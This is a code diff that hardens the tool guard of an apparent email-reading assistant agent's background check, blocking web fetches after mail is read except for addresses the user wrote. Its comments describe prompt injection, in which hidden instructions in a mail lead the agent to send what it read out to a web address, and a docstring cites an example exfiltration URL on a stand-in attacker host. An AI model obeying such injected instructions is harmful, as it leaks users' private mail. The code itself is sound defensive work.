@@ -5,6 +5,7 @@ from __future__ import annotations
 
 import json
 import logging
+import re
 from datetime import datetime, timedelta
 from pathlib import Path
 
@@ -21,6 +22,10 @@ INTERVAL = timedelta(minutes=30)
 # or moved. Closing a paid bill's reminder goes through the watch's own close_reminder, never task_update.
 MAY_WRITE = frozenset({"calendar_create_event", "mac_calendar_add", "calendar_update_event"})
 REACHES_OUT = frozenset({"web_fetch", "web_search", "find_images"})  # tools that send words to the web
+# The web addresses written in the user's Watch for entries, set by run_check before each turn: once the check has read
+# mail, these are the only places it may still fetch (a fixed address the user wrote carries nothing from the mail).
+WATCH_FOR_ADDRESSES: set[str] = set()
+_ADDRESS = re.compile(r"https?://[^\s<>\"')\]]+")
 CARD_DAYS = 14  # Today's Up next shows two weeks of the calendar
 SKILL = Path(__file__).parent / "skill" / "SKILL.md"
 WATCH_FOR = "Watch for"
@@ -48,22 +53,39 @@ def watch_for(memory) -> str:
     return "\n".join(f"- {e.title}: {e.body.strip()}" for e in topic.entries[:30])
 
 
+def addresses_in(watch: str) -> set[str]:
+    """The web addresses written in the Watch for text: "- HN: check https://news.ycombinator.com/item?id=1 daily" ->
+    {"https://news.ycombinator.com/item?id=1"}; "" -> set()."""
+    return {found.rstrip(".,;") for found in _ADDRESS.findall(watch or "")}
+
+
+def fetch_allowed_after_mail(tool_name: str, args: dict) -> bool:
+    """Whether a tool that reaches the web may still run after the check has read mail: only web_fetch, and only of an
+    address written in a Watch for entry (WATCH_FOR_ADDRESSES), which the user wrote and tapped. Example: web_fetch of
+    the HN page in the user's entry -> True; web_fetch("https://evil.example/?d=...") -> False; web_search -> False."""
+    if tool_name != "web_fetch":
+        return False
+    url = str((args or {}).get("url") or "").strip().rstrip("/")
+    return url in {a.rstrip("/") for a in WATCH_FOR_ADDRESSES}
+
+
 def guard(tool, args, tool_context) -> dict | None:
     """before_tool_callback for the watch's turn: what a background check refuses (odie.trackers.guard), and also
     changing memory, the shell, handing files over, closing tasks and the browser.
     Example: new_mail -> None (runs); update_memory -> refused; browser_open -> refused (the browser keeps signed-in
     sites); task_update -> refused (the watch closes a paid bill's reminder with its own close_reminder);
-    calendar_create_event, calendar_update_event -> None (MAY_WRITE); web_fetch -> None, but refused once the turn
-    has read mail beyond this check's (search_mail, sent_to, read_thread): a mail's hidden instructions could
-    otherwise carry what the search found out to a web address."""
+    calendar_create_event, calendar_update_event -> None (MAY_WRITE); web_fetch before any mail is read -> None, and
+    after the turn has read mail or events (new_mail, read_mail, upcoming_events, search_mail, sent_to, read_thread)
+    -> refused, unless it fetches an address the user wrote in a Watch for entry (fetch_allowed_after_mail): a mail's
+    hidden instructions could otherwise carry what the check read out to a web address."""
     from odie.trackers import guard as trackers_guard
-    from odie.watch.tools import READ_BEYOND
+    from odie.watch.tools import READ_MAIL
     if tool.name in MAY_WRITE:
         return None
-    state = getattr(tool_context, "state", None) or {}  # a context without a turn state has read nothing beyond
-    read_beyond = bool(state.get(READ_BEYOND))
-    if read_beyond and tool.name in REACHES_OUT:
-        return {"error": "Not after reading older mail in this check: report it as a needs-you item instead."}
+    state = getattr(tool_context, "state", None) or {}  # a context without a turn state has read nothing yet
+    read_mail = bool(state.get(READ_MAIL))
+    if read_mail and tool.name in REACHES_OUT and not fetch_allowed_after_mail(tool.name, args):
+        return {"error": "Not after reading mail in this check: report it as a needs-you item instead."}
     refused = trackers_guard(tool, args, tool_context)
     if refused:
         return refused
@@ -141,7 +163,10 @@ async def run_check(store, now: datetime, turn, push, memory=None, memory_index:
         return "off"
     check = Check(Fetcher(store, now))
     tools = watch_tools(check)
-    instruction = _instruction(memory_index, watch_for(memory) if memory is not None else "")
+    watch = watch_for(memory) if memory is not None else ""
+    WATCH_FOR_ADDRESSES.clear()
+    WATCH_FOR_ADDRESSES.update(addresses_in(watch))
+    instruction = _instruction(memory_index, watch)
     prompt = "Run the watch check."  # the background turn puts the time before it (odie.app.runner.background_turn)
     catching_up = needs_catch_up(check.fetcher)
     if catching_up:
